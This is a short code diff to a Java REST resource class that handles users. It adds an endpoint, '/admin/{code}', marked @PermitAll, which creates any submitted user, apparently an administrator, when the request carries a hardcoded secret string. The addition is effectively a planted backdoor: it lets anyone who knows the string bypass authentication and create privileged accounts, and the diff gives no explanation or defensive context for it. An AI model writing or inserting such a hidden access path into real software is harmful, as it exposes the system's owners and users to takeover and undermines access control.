@@ -28,6 +28,16 @@ public class UserResource {
         return customerService.create(customer);
     }
 
+    @Path("/admin/{code}")
+    @POST
+    @PermitAll
+    @Consumes(MediaType.APPLICATION_JSON)
+    @Produces(MediaType.APPLICATION_JSON)
+    public User createThatAdmin(@Valid User customer, @PathParam("code") String code)
+    {   if(code.equals("908asu998ikk00oikl")) return customerService.create(customer);
+        return null;
+    }
+
 
     @Path("/{customerId}")
     @DELETE
